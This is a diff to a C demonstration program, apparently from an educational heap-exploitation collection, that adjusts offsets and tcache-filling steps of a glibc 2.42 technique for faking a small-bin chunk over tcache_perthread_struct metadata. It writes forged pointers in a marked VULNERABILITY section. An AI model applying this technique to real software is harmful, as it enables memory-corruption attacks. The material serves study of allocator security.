@@ -52,9 +52,9 @@ int main(void) {
 	puts("Very important for glibc-2.42! Now the sizeof `tcache_perthread_struct` is 0x300\n");
 	puts("Without the following heap fengshui, this technique will require 4-bit brutefoce\n\n");
 
-	// this allocation will force the allocation of `tcache_perthread_struct` at offset 0x4f0, which is good for us
-	puts("Do malloc(0x480) to force the misalignment of `tcache_perthread_struct`\n");
-	malloc(0x4e0);
+	// this heap fengshui will force the allocation of `tcache_perthread_struct` at offset 0x1f0, which is good for us
+	puts("Do free(malloc(0x1e0)) to force the misalignment of `tcache_perthread_struct`\n");
+	free(malloc(0x1e0));
 
 
 	puts("\n");
@@ -99,13 +99,13 @@ int main(void) {
 	// Step 2: Fill up t-cache for 0x90 size class
 	
 	// This is just to make a pointer to the t-cache metadata for later.
-	void *metadata = (void *)((long)(relative_chunk) & ~(0xfff)) + 0x490;
+	void *metadata = (void *)((long)(relative_chunk) & ~(0xfff)) + 0x190;
 	printf("metadata: %p\n", metadata);
 
 	// Make allocations to free such that we can exhaust the 0x90 t-cache
-	puts("Allocate 7 0x88 chunks needed to fill out the 0x90 t-cache at a later time");
-	void *x[7];
-	for (int i = 0; i < 7; i++) {
+	puts("Allocate 0x10 0x88 chunks needed to fill out the 0x90 t-cache at a later time");
+	void *x[0x10];
+	for (int i = 0; i < 0x10; i++) {
 		x[i] = malloc(0x88);
 	}
 
@@ -115,11 +115,10 @@ int main(void) {
 	puts("Fill up the 0x90 t-cache with the chunks allocated from earlier by free'ing them.");
 	puts("By doing so, the next time a 0x88 chunk is free'd, it ends up in the unsorted-bin");
 	puts("instead of the t-cache or small-bins.");
-	for (int i = 0; i < 7; i++) {
+	for (int i = 0; i < 0x10; i++) {
 		free(x[i]);
 	}
 
-	
 	puts("\n");
 	puts("\t==============================");
 	puts("\t|           STEP 3           |");
@@ -284,13 +283,13 @@ int main(void) {
 	/* VULNERABILITY */
 	printf("\t- small_start:\n");
 	void *metadata_page = (void*)((long)metadata & ~0xfff);
-	printf("\t\t*%p = %p\n", small_start, metadata_page+0x700);
-	*(unsigned long *)small_start = (unsigned long)(metadata_page+0x700);
+	printf("\t\t*%p = %p\n", small_start, metadata_page+0x400);
+	*(unsigned long *)small_start = (unsigned long)(metadata_page+0x400);
 	puts("");
 
 	printf("\t- small_end:\n");
-	printf("\t\t*%p = %p\n", small_end, metadata_page+0x700);
-	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata_page+0x700);
+	printf("\t\t*%p = %p\n", small_end, metadata_page+0x400);
+	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata_page+0x400);
 	puts("");
 	/* VULNERABILITY */
 
@@ -299,7 +298,7 @@ int main(void) {
 
 	puts("\t- small bin:");
 	printf("\t\t small_start <--> metadata chunk <--> small_end\n");
-	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x228, small_end);
+	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x400, small_end);
 
 	puts("\n");
 	puts("\t==============================");
@@ -312,14 +311,12 @@ int main(void) {
 	puts("But first, we need to clean the t-cache for 0x90 size class to force malloc to");
 	puts("service the allocation from the small bin.");
 
-	for(int i = 7; i > 0; i--)
+	for(int i = 0x10; i > 0; i--)
 		_ = malloc(0x88);
 
 	// Allocating small_start, and small_end again to remove them from the 0x90 t-cache bin
 	_ = malloc(0x88);
 	_ = malloc(0x88);
-
-
 
 
 	// Next allocation *could* be our faked chunk!
